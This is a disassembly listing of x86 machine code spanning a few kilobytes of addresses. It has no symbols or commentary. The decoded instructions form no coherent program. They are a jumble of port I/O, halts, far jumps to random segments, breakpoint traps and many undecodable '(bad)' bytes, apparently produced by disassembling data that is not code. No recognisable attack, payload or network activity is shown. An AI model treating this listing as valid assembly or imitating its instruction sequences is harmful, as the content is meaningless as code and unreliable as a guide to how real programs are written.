  411e1f:	repnz outs dx,BYTE PTR ds:[esi]
  411e21:	test   edi,esi
  411e23:	jmp    0xfd2b:0x73188869
  411e2a:	sahf   
  411e2b:	add    BYTE PTR [eax+0x6a],dh
  411e2e:	push   ds
  411e2f:	pop    eax
  411e30:	int3   
  411e31:	out    dx,eax
  411e32:	jg     0x411e70
  411e34:	or     DWORD PTR [edi-0x6e322adf],ebp
  411e3a:	cs pop ebx
  411e3c:	jmp    0x99065015
  411e41:	push   es
  411e42:	lock mov ebx,0x80a6995a
  411e48:	test   eax,0xd1fe69c2
  411e4d:	xchg   BYTE PTR [eax+0x21f0f955],ch
  411e53:	sbb    cl,dh
  411e55:	mov    DWORD PTR [ebx-0xad54214],edi
  411e5b:	mov    esp,0x4cbdeeb2
  411e60:	fld    TBYTE PTR [ebp+0x7e]
  411e63:	pop    ds
  411e64:	mov    ah,0xc0
  411e66:	hlt    
  411e67:	in     eax,dx
  411e68:	and    BYTE PTR [edi+0x3de13ac6],cl
  411e6e:	pop    ecx
  411e6f:	sbb    BYTE PTR [edi+0x8],bl
  411e72:	jnp    0x411e88
  411e74:	sbb    DWORD PTR cs:0x36024e4,ecx
  411e7b:	add    DWORD PTR [edi],0x31c5df97
  411e81:	dec    esp
  411e82:	int    0x7f
  411e84:	sub    al,BYTE PTR [edx-0x2f]
  411e87:	daa    
  411e88:	mov    BYTE PTR [eax],bh
  411e8a:	sbb    DWORD PTR [ebx+0x44b55725],0xfea098fb
  411e94:	mov    ?,edx
  411e96:	sbb    ecx,DWORD PTR [ecx-0x340660d6]
  411e9c:	frstor [edx+edi*2+0x70]
  411ea0:	jge    0x411e30
  411ea2:	mov    ch,0xd0
  411ea4:	(bad)  
  411ea5:	sbb    edi,ebx
  411ea7:	out    0x56,al
  411ea9:	mov    edi,0x8d74aa3f
  411eae:	and    DWORD PTR [ebx+0x319e9fcd],edi
  411eb4:	in     eax,0x7
  411eb6:	or     ecx,esi
  411eb8:	out    0xb0,al
  411eba:	mov    cl,0x6
  411ebc:	pop    ds
  411ebd:	sub    ch,BYTE PTR [edx]
  411ebf:	push   es
  411ec0:	mov    ecx,0xd2a9e5c6
  411ec5:	xchg   eax,ebx
  411ec7:	jbe    0x411e7c
  411ec9:	out    0xd0,al
  411ecb:	repz push edi
  411ecd:	in     eax,dx
  411ece:	and    eax,0xd5ed9a62
  411ed3:	(bad)  
  411ed4:	ror    DWORD PTR [edi+0x14],cl
  411ed7:	adc    dl,BYTE PTR [ebx]
  411ed9:	fistp  DWORD PTR [edi]
  411edb:	fwait
  411edc:	std    
  411edd:	lods   al,BYTE PTR ds:[esi]
  411ede:	push   esp
  411edf:	mov    bl,0xbf
  411ee1:	sti    
  411ee2:	cmp    ah,dh
  411ee4:	pop    eax
  411ee5:	pop    esi
  411ee6:	xor    esp,DWORD PTR [edx-0x1f8f0370]
  411eec:	data16 aam 0xdb
  411eef:	or     bh,ch
  411ef1:	out    0x3a,eax
  411ef3:	ins    DWORD PTR es:[edi],dx
  411ef4:	nop
  411ef5:	dec    edi
  411ef6:	loop   0x411ed1
  411ef8:	dec    esp
  411ef9:	mov    ah,0x90
  411efb:	xor    al,0xc0
  411efd:	(bad)  
  411efe:	fiadd  DWORD PTR [edi]
  411f00:	popa   
  411f01:	lea    ecx,[eax+0x6a]
  411f04:	enter  0xa3ba,0x45
  411f08:	imul   di,WORD PTR [ebx+0x55e1dd41],0xff80
  411f10:	(bad)  
  411f11:	rcr    BYTE PTR [ecx-0x53],1
  411f14:	jge    0x411ecc
  411f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f17:	or     eax,edi
  411f19:	mov    al,0x50
  411f1b:	inc    edx
  411f1c:	shl    BYTE PTR [esp+edi*4-0x5b],1
  411f20:	imul   eax,ebx,0x1b3f6bd6
  411f26:	cmp    bh,BYTE PTR [eax+ecx*4]
  411f29:	stc    
  411f2a:	pop    edi
  411f2b:	dec    eax
  411f2c:	loopne 0x411f62
  411f2e:	mov    BYTE PTR [edx+0x1],dl
  411f31:	jno    0x411efc
  411f33:	les    ebp,FWORD PTR [ebp+edi*8-0x9730973]
  411f3a:	cmp    eax,0x8fcc9f73
  411f3f:	or     al,0xed
  411f41:	adc    BYTE PTR [eax+eax*8+0x18],dh
  411f45:	into   
  411f46:	aaa    
  411f47:	cwde   
  411f48:	lods   al,BYTE PTR ds:[esi]
  411f49:	mov    ds:0x36bd3d5b,al
  411f4e:	daa    
  411f4f:	jge    0x411ed9
  411f51:	cmp    DWORD PTR [ebp+0x33],0x765c39b2
  411f58:	fwait
  411f59:	shl    BYTE PTR [edx-0x12],cl
  411f5c:	test   al,0x86
  411f5e:	add    ebx,DWORD PTR [esi]
  411f60:	data16 (bad) 
  411f62:	lods   eax,DWORD PTR ds:[esi]
  411f63:	and    al,0xdd
  411f65:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411f67:	add    DWORD PTR [esi],ebp
  411f69:	(bad)  
  411f6a:	mov    bh,BYTE PTR [edx-0x914d661]
  411f70:	retf   
  411f71:	add    eax,0xcf99374c
  411f76:	push   0xfb97d417
  411f7b:	loope  0x411fbe
  411f7d:	sbb    bh,BYTE PTR [ecx]
  411f7f:	cmp    DWORD PTR [edx],ebx
  411f81:	lahf   
  411f82:	popf   
  411f83:	out    0xbb,eax
  411f85:	mov    al,ds:0x257509ab
  411f8a:	adc    al,0x95
  411f8c:	dec    edi
  411f8d:	outs   dx,BYTE PTR ds:[esi]
  411f8e:	stos   BYTE PTR es:[edi],al
  411f8f:	xchg   bl,dh
  411f91:	das    
  411f92:	mov    DWORD PTR [ebx-0x4f261f21],edi
  411f98:	adc    al,0xea
  411f9a:	les    edi,FWORD PTR [edi-0x2ef9676e]
  411fa0:	cmp    dl,bl
  411fa2:	into   
  411fa3:	push   ds
  411fa4:	mov    eax,ds:0xf1029d63
  411fa9:	loop   0x41201e
  411fab:	in     al,0x80
  411fad:	jnp    0x412005
  411faf:	inc    esi
  411fb0:	xor    ch,0x44
  411fb3:	xor    DWORD PTR [di-0x642a],ebp
  411fb8:	jae    0x412018
  411fba:	xchg   edi,eax
  411fbb:	les    esp,FWORD PTR [ebp+0x25ed20e4]
  411fc1:	push   esi
  411fc2:	imul   esi,DWORD PTR [ecx-0x6573507e],0xffffffe8
  411fc9:	loopne 0x412013
  411fcb:	add    al,0xe5
  411fcd:	stos   DWORD PTR es:[edi],eax
  411fce:	lods   al,BYTE PTR ds:[esi]
  411fcf:	arpl   WORD PTR [ecx],si
  411fd1:	xor    al,0xb2
  411fd3:	xchg   esi,eax
  411fd4:	nop
  411fd5:	cmp    ebx,DWORD PTR [ebx-0x19bf1d94]
  411fdb:	daa    
  411fdc:	add    dl,BYTE PTR [eax]
  411fde:	loope  0x412043
  411fe0:	mov    dl,0xe3
  411fe2:	aam    0x71
  411fe4:	pop    eax
  411fe5:	sar    DWORD PTR [ebp+0xd],1
  411fe8:	xchg   edi,eax
  411fe9:	jno    0x412038
  411feb:	hlt    
  411fec:	call   0xa6e0:0x6b9f6cf7
  411ff3:	fcom   DWORD PTR [eax*4-0x1823397e]
  411ffa:	int3   
  411ffb:	jecxz  0x411fed
  411ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ffe:	jbe    0x411ff1
  412000:	pop    es
  412001:	es mov ch,0x29
  412004:	out    0xb2,eax
  412006:	mov    bl,0x77
  412008:	retf   
  412009:	xor    edx,0x89608465
  41200f:	ror    BYTE PTR [ebx+eax*2],cl
  412012:	adc    al,0xcb
  412014:	imul   ebx,DWORD PTR [ecx+ebp*4-0x6e],0xffffffea
  412019:	in     eax,dx
  41201a:	push   0x3c
  41201c:	aam    0xd9
  41201e:	neg    eax
  412020:	(bad)  
  412021:	pop    eax
  412022:	jo     0x41205d
  412024:	mov    dh,0xb2
  412026:	ss pop ebp
  412028:	mov    es,WORD PTR [ecx+0x59]
  41202b:	push   es
  41202c:	dec    esp
  41202d:	aam    0x1
  41202f:	or     eax,0x2571eb5d
  412034:	shl    DWORD PTR ds:[ecx+0x3440c6a6],cl
  41203b:	mov    BYTE PTR [edi-0x1d],dl
  41203e:	dec    ebp
  41203f:	inc    esi
  412040:	push   cs
  412041:	mov    ds:0x8bc131af,eax
  412046:	test   al,0x4
  412048:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41204a:	adc    al,0x20
  41204c:	lahf   
  41204d:	lock mov ah,0x64
  412050:	mov    gs,WORD PTR [edx-0x8]
  412053:	mov    BYTE PTR [ebx+0x22],cl
  412056:	jecxz  0x411fe9
  412058:	test   BYTE PTR [edx-0x70eeff34],dl
  41205e:	mov    esi,0xd8bdb9
  412063:	jecxz  0x412028
  412065:	inc    ebx
  412066:	xchg   edi,eax
  412067:	adc    esp,DWORD PTR [edx]
  412069:	test   eax,0xc546b64b
  41206e:	lods   al,BYTE PTR ds:[esi]
  41206f:	outs   dx,DWORD PTR ds:[esi]
  412070:	lahf   
  412071:	pop    ecx
  412072:	(bad)
  412076:	retf   
  412077:	xor    dh,bl
  412079:	jno    0x412075
  41207b:	cdq    
  41207c:	sub    DWORD PTR [ecx-0xf],0xffffffc6
  412080:	inc    esp
  412081:	xchg   ecx,eax
  412082:	pushf  
  412083:	mov    dh,0x34
  412085:	fstp   QWORD PTR [edi]
  412087:	punpckldq mm6,mm5
  41208a:	or     edx,edx
  41208c:	lahf   
  41208d:	popa   
  41208e:	aas    
  41208f:	ins    BYTE PTR es:[edi],dx
  412090:	repz aaa 
  412092:	test   al,0x86
  412094:	addr16 out 0x96,eax
  412097:	shr    ebx,cl
  412099:	jp     0x412049
  41209b:	push   edx
  41209c:	and    DWORD PTR [ecx-0x4cf72630],ebp
  4120a2:	add    DWORD PTR [edi],0x39eb6413
  4120a8:	inc    edx
  4120a9:	fldenv [ecx]
  4120ab:	dec    ebx
  4120ac:	loope  0x412062
  4120ae:	mov    ebx,DWORD PTR [ecx-0x11]
  4120b1:	add    al,0x64
  4120b3:	inc    ebx
  4120b4:	fwait
  4120b5:	int    0xe1
  4120b7:	out    0x1b,eax
  4120b9:	ror    DWORD PTR [esi+0x3d],0xb1
  4120bd:	repz icebp 
  4120bf:	add    eax,0xcd2f68d2
  4120c4:	cmp    dl,ch
  4120c6:	(bad)  
  4120c7:	push   ecx
  4120c8:	js     0x412101
  4120ca:	ret    0x7411
  4120cd:	mov    edi,eax
  4120cf:	inc    ebx
  4120d0:	daa    
  4120d1:	call   0xd57b:0xd8c9ded3
  4120d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120d9:	cld    
  4120da:	test   al,0xf5
  4120dc:	jbe    0x41208f
  4120de:	repz retf 0x50c2
  4120e2:	sbb    DWORD PTR [eax+ebx*8],esp
  4120e5:	cld    
  4120e6:	mov    edi,0x80e4a7d0
  4120eb:	jnp    0x4120ba
  4120ed:	or     ebx,DWORD PTR [edi]
  4120ef:	cmp    ch,BYTE PTR [ebp+0x50eb772c]
  4120f5:	aaa    
  4120f6:	xor    esi,esp
  4120f8:	dec    ebx
  4120f9:	sbb    bh,BYTE PTR [edi+0x18f8db43]
  4120ff:	in     al,0x65
  412101:	push   0xf5dc51f3
  412106:	sbb    BYTE PTR [ebx+0x70499f1f],al
  41210c:	xchg   esp,eax
  41210d:	mov    dl,0xd9
  41210f:	aaa    
  412110:	fsubr  QWORD PTR [ebx+0x728d3c2a]
  412116:	dec    ecx
  412117:	dec    ebp
  412118:	adc    dh,BYTE PTR [edx+ebx*4-0x1414f829]
  41211f:	aaa    
  412120:	aad    0x4a
  412122:	mov    edi,?
  412124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412125:	aaa    
  412126:	loope  0x412123
  412128:	ins    DWORD PTR es:[edi],dx
  412129:	dec    ebp
  41212a:	or     eax,0xd10a8555
  41212f:	pop    edx
  412130:	xor    BYTE PTR [ebp+0x34],bh
  412133:	fmul   DWORD PTR [eax+0x1b054ed4]
  412139:	dec    ebp
  41213a:	jae    0x412182
  41213c:	dec    esp
  41213d:	and    al,0xb7
  41213f:	push   esp
  412140:	call   0x4fedb702
  412145:	fst    QWORD PTR [edx]
  412147:	adc    eax,0xd5e1a6dd
  41214c:	jl     0x412148
  41214e:	add    DWORD PTR [ecx-0x67e40a2a],0xffffff9e
  412155:	pushf  
  412156:	xor    DWORD PTR fs:[eax+0x545199d2],0x60aec3b
  412161:	scas   eax,DWORD PTR es:[edi]
  412162:	xor    BYTE PTR [edx],dh
  412164:	imul   ebx
  412166:	xchg   ecx,eax
  412167:	or     eax,0x84820674
  41216c:	imul   edx,DWORD PTR [edi-0x3e],0x74
  412170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412171:	inc    esi
  412172:	es add al,0xe9
  412175:	pop    ds
  412176:	pop    eax
  412177:	dec    ebx
  412178:	das    
  412179:	adc    esi,ebp
  41217b:	shl    DWORD PTR [ecx-0x4f0bb7be],cl
  412181:	mov    cl,0x28
  412183:	daa    
  412184:	pop    edi
  412185:	add    cl,BYTE PTR [eax+0x527663cc]
  41218b:	icebp  
  41218c:	mov    ch,0x61
  41218e:	es sbb al,0x16
  412191:	mov    eax,0xe1484f89
  412196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412197:	and    edx,ecx
  412199:	stc    
  41219a:	rol    ecx,cl
  41219c:	mov    dh,0x10
  41219e:	xor    al,0x35
  4121a0:	fadd   DWORD PTR [ecx-0x52]
  4121a3:	pushf  
  4121a4:	add    al,ah
  4121a6:	inc    edi
  4121a7:	dec    esp
  4121a8:	pushf  
  4121a9:	les    edx,FWORD PTR [edx-0x60a148ac]
  4121af:	fimul  WORD PTR [ebx+eax*2+0x21]
  4121b3:	int    0x6a
  4121b5:	or     BYTE PTR [ebx],al
  4121b7:	push   esi
  4121b8:	xor    DWORD PTR [ecx+0x7d305e79],ebx
  4121be:	inc    ebp
  4121bf:	sbb    eax,DWORD PTR [edx+0x66f13eab]
  4121c5:	test   edx,eax
  4121c7:	bound  esi,QWORD PTR [edi+0x77]
  4121ca:	popa   
  4121cb:	out    dx,eax
  4121cc:	mov    eax,ebp
  4121ce:	in     eax,0xa3
  4121d0:	pop    edx
  4121d1:	xor    al,dl
  4121d3:	in     eax,dx
  4121d4:	adc    ch,BYTE PTR [ebp-0x19]
  4121d7:	cli    
  4121d8:	inc    edx
  4121d9:	xor    eax,0x80f0c830
  4121de:	bound  ebx,QWORD PTR [ebp+0x3b]
  4121e1:	add    eax,0x8566d26b
  4121e6:	pop    ecx
  4121e7:	mov    DWORD PTR [ebx],ebx
  4121e9:	lds    eax,FWORD PTR [edx]
  4121eb:	cwde   
  4121ec:	retf   0x8bd3
  4121ef:	outs   dx,BYTE PTR ds:[esi]
  4121f0:	loopne 0x412203
  4121f2:	popa   
  4121f3:	pop    edx
  4121f4:	popa   
  4121f5:	push   edi
  4121f6:	test   DWORD PTR [edx+0x5e],ecx
  4121f9:	je     0x4121e5
  4121fb:	push   es
  4121fc:	ja     0x4121c4
  4121fe:	imul   esp,DWORD PTR [ecx],0x64
  412201:	xor    ebp,edi
  412203:	out    dx,eax
  412204:	jnp    0x41219a
  412206:	nop
  412207:	sbb    BYTE PTR [esi-0x73],ah
  41220a:	adc    dh,BYTE PTR [ecx+0x18]
  41220d:	pusha  
  41220e:	retf   0xd29c
  412211:	test   eax,0x2760eb2
  412216:	and    eax,0xfe9e1011
  41221b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41221c:	mov    bl,0xb1
  41221e:	(bad)  
  41221f:	mov    ds:0x7cf98909,eax
  412224:	std    
  412225:	mov    bl,0xb
  412227:	aad    0xa7
  412229:	mov    esi,0x277fdf6e
  41222e:	fsubr  DWORD PTR [esi+0x6007573c]
  412234:	dec    edi
  412235:	in     eax,0xc9
  412237:	jns    0x412284
  412239:	fimul  DWORD PTR [ebp-0x3a88b552]
  41223f:	xchg   ecx,eax
  412240:	mov    eax,ds:0xb23a77d7
  412245:	push   cs
  412246:	and    al,0x62
  412248:	pop    ebx
  412249:	sub    BYTE PTR [eax-0xa],bh
  41224c:	fbstp  TBYTE PTR [edi]
  41224e:	jno    0x41228b
  412250:	ss push ecx
  412252:	ins    BYTE PTR es:[edi],dx
  412253:	repz push edx
  412255:	add    al,0x97
  412257:	shl    BYTE PTR ds:0x1f9b9069,0x7d
  41225e:	jecxz  0x412241
  412260:	cmp    al,BYTE PTR [edx+ebp*2-0x74474b9c]
  412267:	jecxz  0x4122d0
  412269:	int3   
  41226a:	mov    edi,0xd641691a
  41226f:	push   esi
  412270:	jbe    0x412201
  412272:	(bad)  
  412273:	(bad)  
  412274:	pop    eax
  412275:	cli    
  412276:	mov    bh,0x13
  412278:	int    0x14
  41227a:	(bad)  
  41227b:	nop
  41227c:	mov    ebp,0xf9a9bbff
  412281:	push   ebx
  412282:	dec    esi
  412283:	adc    DWORD PTR [esi+edx*2],edi
  412286:	pop    esp
  412287:	icebp  
  412288:	inc    esi
  412289:	ror    ch,cl
  41228b:	dec    edi
  41228c:	jne    0x412298
  41228e:	je     0x41229d
  412290:	pop    esp
  412291:	fadd   QWORD PTR [edx]
  412293:	int3   
  412294:	inc    edi
  412295:	les    ecx,FWORD PTR [ebx-0x323a3c47]
  41229b:	jmp    0x412235
  41229d:	dec    ebx
  41229e:	retf   
  41229f:	mov    eax,0x68731b6b
  4122a4:	pop    edx
  4122a5:	xchg   edi,eax
  4122a6:	loopne 0x41225d
  4122a8:	push   es
  4122a9:	pop    edx
  4122aa:	addr16 mov edx,0xc59c683b
  4122b0:	sti    
  4122b1:	adc    eax,0x3d61833d
  4122b6:	dec    esi
  4122b7:	inc    esi
  4122b8:	scas   al,BYTE PTR es:[edi]
  4122b9:	pop    ebx
  4122ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122bb:	aad    0x33
  4122bd:	xchg   esp,eax
  4122be:	mov    dh,0x75
  4122c0:	ret    0xc1a9
  4122c3:	pushf  
  4122c4:	xor    bh,BYTE PTR [esi]
  4122c6:	retf   0x55ee
  4122c9:	int3   
  4122ca:	mov    edi,0x31c44d5
  4122cf:	test   al,0x66
  4122d1:	cmp    eax,0x8402d2ac
  4122d6:	dec    esi
  4122d7:	(bad)  
  4122d8:	push   eax
  4122d9:	fsubr  st,st(7)
  4122db:	fistp  QWORD PTR [ebx]
  4122dd:	aas    
  4122de:	mov    ss,WORD PTR [edx+0x2d]
  4122e1:	bound  eax,QWORD PTR [esi+0x40]
  4122e4:	inc    ebx
  4122e5:	mov    ds:0x73478140,al
  4122ea:	(bad)  
  4122eb:	cmp    edx,DWORD PTR [ebp+0x16bf802b]
  4122f1:	mov    bl,0xe2
  4122f3:	mov    esp,0x9c85c73b
  4122f8:	fld    DWORD PTR [ecx+0xf95e08a]
  4122fe:	enter  0x87e1,0x9
  412302:	cmc    
  412303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412304:	jns    0x4122b0
  412306:	mov    ah,ch
  412308:	cmc    
  412309:	pop    esi
  41230a:	mov    WORD PTR [esi+0x53],es
  41230d:	xchg   ecx,eax
  41230e:	cmp    bh,BYTE PTR [ebp+0x53706ffe]
  412314:	test   BYTE PTR [edi+0x3c4545a8],0x83
  41231b:	and    BYTE PTR [esi],cl
  41231d:	repz xchg edx,eax
  41231f:	(bad)  
  412320:	jmp    0x1b84:0x9cc04e33
  412327:	mov    dl,0x9
  412329:	mov    ds:0x219b0ed7,eax
  41232e:	xchg   BYTE PTR [edx+edi*2+0x49bad9cb],dh
  412335:	mov    DWORD PTR [edx+ebx*4-0x80],esi
  412339:	jl     0x4122ed
  41233b:	dec    esp
  41233c:	adc    DWORD PTR [eax+0x43],ebp
  41233f:	test   eax,0x657fa84f
  412344:	xchg   ebx,eax
  412345:	mov    WORD PTR [ebx-0x10],ds
  412348:	loopne 0x412304
  41234a:	ins    DWORD PTR es:[edi],dx
  41234b:	adc    eax,0xc78d191f
  412350:	je     0x4123be
  412352:	ja     0x41238a
  412354:	clc    
  412355:	or     bl,BYTE PTR [esi+eax*1]
  412358:	dec    BYTE PTR [esi-0x3b]
  41235b:	pop    edi
  41235c:	idiv   DWORD PTR [esp+edx*8]
  41235f:	fwait
  412360:	cld    
  412361:	inc    esp
  412362:	pop    ebx
  412363:	sub    BYTE PTR [edx-0x32c4559d],bl
  412369:	mov    ecx,DWORD PTR [ecx]
  41236b:	into   
  41236c:	lds    ebx,FWORD PTR [edx]
  41236e:	mov    bl,ch
  412370:	sbb    al,0xcd
  412372:	ret    0x7800
  412375:	mov    esi,DWORD PTR [edx-0x57e70d38]
  41237b:	es push ebx
  41237d:	and    al,0xd
  41237f:	div    DWORD PTR [edx+0x16]
  412382:	jp     0x4123ca
  412384:	in     eax,0x9d
  412386:	add    DWORD PTR [eax],ecx
  412388:	sbb    al,0xe2
  41238a:	cmp    BYTE PTR [ebp-0x5e],ch
  41238d:	out    0xef,al
  41238f:	les    edx,FWORD PTR ds:0xa986fa9d
  412395:	cmc    
  412396:	sub    BYTE PTR [edx+ebx*1+0x26063dc8],cl
  41239d:	jnp    0x41238e
  41239f:	sbb    dl,BYTE PTR [ecx+0x11b6b409]
  4123a5:	xchg   ebx,eax
  4123a6:	or     eax,0xab56ba20
  4123ab:	out    dx,eax
  4123ac:	sbb    al,0xbf
  4123ae:	in     eax,dx
  4123af:	ret    0x3012
  4123b2:	js     0x4123a1
  4123b4:	adc    ebp,DWORD PTR [edx-0x74]
  4123b7:	cmp    al,0x65
  4123b9:	test   al,0x56
  4123bb:	cwde   
  4123bc:	mov    bl,0x17
  4123be:	aas    
  4123bf:	add    dl,bl
  4123c1:	pop    ecx
  4123c2:	popa   
  4123c3:	pop    ecx
  4123c4:	fucom  st(7)
  4123c6:	(bad)  
  4123c7:	out    0x5a,eax
  4123c9:	aaa    
  4123ca:	pop    esp
  4123cb:	cdq    
  4123cc:	retf   
  4123cd:	xchg   ecx,eax
  4123ce:	cmp    BYTE PTR [ecx-0x15],bh
  4123d1:	jle    0x412449
  4123d3:	push   ecx
  4123d4:	outs   dx,DWORD PTR ds:[esi]
  4123d5:	sbb    DWORD PTR [esi+0x7c1789ea],ebp
  4123db:	xlat   BYTE PTR ds:[ebx]
  4123dc:	mov    DWORD PTR [ebp+0x24],edi
  4123df:	cmp    edx,edi
  4123e1:	call   0xff6a:0x692940fa
  4123e8:	(bad)  
  4123e9:	ins    BYTE PTR es:[edi],dx
  4123ea:	ss jbe 0x4123d7
  4123ed:	sub    esp,ecx
  4123ef:	jbe    0x4123dd
  4123f1:	dec    eax
  4123f2:	xchg   edi,eax
  4123f3:	mov    ah,0x67
  4123f5:	xchg   ecx,eax
  4123f6:	mov    eax,ds:0x9fecc01f
  4123fb:	jnp    0x41241a
  4123fd:	push   ebx
  4123fe:	add    DWORD PTR [eax],ebx
  412400:	jg     0x412458
  412402:	shl    DWORD PTR es:[esp+edx*2],1
  412406:	jecxz  0x4123cc
  412408:	daa    
  412409:	fstp   QWORD PTR [ecx+0x2cb70901]
  41240f:	loopne 0x412443
  412411:	int    0xcd
  412413:	mov    cl,0x9a
  412415:	lahf   
  412416:	mov    bl,BYTE PTR [edi+eiz*4+0x38c9d32d]
  41241d:	cmp    BYTE PTR ds:0xc2c8946d,cl
  412423:	sub    al,0x69
  412425:	add    DWORD PTR [edx],esi
  412427:	rol    esi,cl
  412429:	mov    ds:0x7c68ab42,eax
  41242e:	or     esp,DWORD PTR [esi+ecx*2+0x4b688f2b]
  412435:	in     al,0x0
  412437:	pop    esi
  412438:	pop    esi
  412439:	and    edi,DWORD PTR [eax-0x4356fa76]
  41243f:	xchg   ebx,eax
  412440:	ja     0x4123d4
  412442:	push   esi
  412443:	test   DWORD PTR ds:0xdae869db,0xf51de847
  41244d:	push   esi
  41244e:	cvtpi2ps xmm6,QWORD PTR [esi+0x38]
  412452:	add    bh,BYTE PTR [edx+0x3d8bcba1]
  412458:	pop    ds
  412459:	ror    BYTE PTR [esi-0x65],1
  41245c:	out    0x8f,al
  41245e:	jne    0x41249a
  412460:	and    BYTE PTR [esi-0x56],bh
  412463:	test   al,0xed
  412465:	sbb    al,0x24
  412467:	(bad)  
  412468:	mov    edx,0x1f934dd1
  41246d:	nop
  41246e:	jp     0x412462
  412470:	repnz or BYTE PTR [esi-0x6b336939],ch
  412477:	mov    ah,0xad
  412479:	inc    esp
  41247a:	in     eax,dx
  41247b:	push   ebp
  41247c:	sti    
  41247d:	cdq    
  41247e:	loope  0x412436
  412480:	inc    ebp
  412481:	stc    
  412482:	scas   al,BYTE PTR es:[edi]
  412483:	pop    ds
  412484:	ds adc al,0x72
  412487:	nop
  412488:	mov    esp,0x6e6879a9
  41248d:	pcmpgtw mm2,QWORD PTR [esi-0x2002848]
  412494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412495:	jae    0x4124f1
  412497:	inc    eax
  412498:	shl    bh,cl
  41249a:	data16 jmp 0x412486
  41249d:	sahf   
  41249e:	iret   
  41249f:	mov    esp,0xc62874c0
  4124a4:	add    DWORD PTR [edx+edi*4],ebx
  4124a7:	lock test al,0xbb
  4124aa:	cs repz pop edx
  4124ad:	xchg   esi,eax
  4124ae:	xchg   edx,eax
  4124af:	loope  0x4124f8
  4124b1:	adc    BYTE PTR [ecx],cl
  4124b3:	leave  
  4124b4:	adc    edi,edx
  4124b6:	scas   al,BYTE PTR es:[edi]
  4124b7:	sbb    cl,bl
  4124b9:	sub    ch,BYTE PTR [ecx+0x753c4a5d]
  4124bf:	inc    ebx
  4124c0:	mov    bh,0xf1
  4124c2:	enter  0xfbb4,0xf3
  4124c6:	test   eax,0x8ddd11f7
  4124cb:	inc    eax
  4124cc:	shr    BYTE PTR [edx],0xde
  4124cf:	pop    esp
  4124d0:	push   esi
  4124d1:	mov    ebx,0xeee86615
  4124d6:	fcomi  st,st(2)
  4124d8:	loop   0x4124b9
  4124da:	pop    edi
  4124db:	add    eax,0x78802c33
  4124e0:	or     al,0xbb
  4124e2:	int    0x52
  4124e4:	lods   eax,DWORD PTR ds:[esi]
  4124e5:	repnz loop 0x41255d
  4124e8:	retf   0x1619
  4124eb:	add    ebx,ebp
  4124ed:	(bad)  
  4124ee:	sub    DWORD PTR [ebp+0x79c47693],eax
  4124f4:	push   edi
  4124f5:	cmp    bh,BYTE PTR [ebx]
  4124f7:	xor    eax,0x8d3e1337
  4124fc:	push   cs
  4124fd:	inc    esp
  4124fe:	leave  
  4124ff:	ja     0x412528
  412501:	lea    eax,[eax+eiz*8-0x26]
  412505:	test   ecx,0xc93096fc
  41250b:	lods   eax,DWORD PTR ds:[esi]
  41250c:	push   edx
  41250d:	iret   
  41250e:	cwde   
  41250f:	mov    ?,WORD PTR [ebp+ecx*4-0x69]
  412513:	shr    ch,0x47
  412516:	pop    ebx
  412517:	or     ebp,eax
  412519:	dec    ebp
  41251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41251b:	pop    esp
  41251c:	cli    
  41251d:	fst    st(4)
  41251f:	mov    ds:0x8ee6231d,eax
  412524:	sub    esi,eax
  412526:	sar    BYTE PTR [esi-0x5747b01e],1
  41252c:	punpckhbw mm5,QWORD PTR [ebx-0x486c2dbb]
  412533:	xor    ah,dl
  412535:	fcom   QWORD PTR [esi-0x56a7c79f]
  41253b:	pop    esp
  41253c:	dec    edx
  41253d:	push   esi
  41253e:	jns    0x41250f
  412540:	xchg   edx,eax
  412541:	inc    esp
  412542:	stos   BYTE PTR es:[edi],al
  412543:	add    eax,0xda155b38
  412548:	out    dx,eax
  412549:	pop    esi
  41254a:	add    al,BYTE PTR [edi]
  41254c:	push   cs
  41254d:	out    0x45,al
  41254f:	ror    BYTE PTR ds:[edx-0x1e],0xf7
  412554:	or     BYTE PTR [esi+0x23f9d3bb],ah
  41255a:	dec    edx
  41255b:	ins    BYTE PTR es:[edi],dx
  41255c:	fwait
  41255d:	test   BYTE PTR [edi+0x41],0x74
  412561:	stos   DWORD PTR es:[edi],eax
  412562:	xchg   esi,eax
  412563:	in     eax,dx
  412564:	mov    ecx,DWORD PTR ds:0xef335f84
  41256a:	push   eax
  41256b:	mov    dl,0x7b
  41256d:	ror    DWORD PTR [eax+0x7c],0x9a
  412571:	cld    
  412572:	xchg   esi,eax
  412573:	push   esp
  412574:	jle    0x412589
  412576:	mov    di,WORD PTR ds:0xce7f4728
  41257d:	mov    ebx,0x2052ba0a
  412582:	test   DWORD PTR ds:0x6ebc7016,ebp
  412588:	or     DWORD PTR [esi-0x4dafb11c],0x7ca3af9d
  412592:	push   ecx
  412593:	call   0x58fa:0x42758421
  41259a:	cmp    DWORD PTR ds:0x2c58c75d,0x6c4fb860
  4125a4:	scas   al,BYTE PTR es:[edi]
  4125a5:	sbb    BYTE PTR [esi-0x70da747f],bh
  4125ab:	jbe    0x412588
  4125ad:	retf   0x797a
  4125b0:	adc    eax,0xd4ae5747
  4125b5:	int3   
  4125b6:	fucomi st,st(6)
  4125b8:	ret    
  4125b9:	(bad)  
  4125ba:	and    edi,DWORD PTR [esi]
  4125bc:	jp     0x412629
  4125be:	pop    edi
  4125bf:	xor    ah,ch
  4125c1:	sub    BYTE PTR [esi-0x7f902836],dh
  4125c7:	es fwait
  4125c9:	cs cmp al,cl
  4125cc:	(bad)  
  4125cd:	cmp    DWORD PTR [ebx],ecx
  4125cf:	jae    0x41262c
  4125d1:	add    dl,cl
  4125d3:	push   esp
  4125d4:	push   es
  4125d5:	call   0x5242:0x1ec70094
  4125dc:	pop    ecx
  4125dd:	mov    ds:0xe4306c56,eax
  4125e2:	xchg   ebp,eax
  4125e3:	adc    eax,DWORD PTR [ecx+0x3a0bfc09]
  4125e9:	or     eax,0x451b3d96
  4125ee:	jle    0x4125db
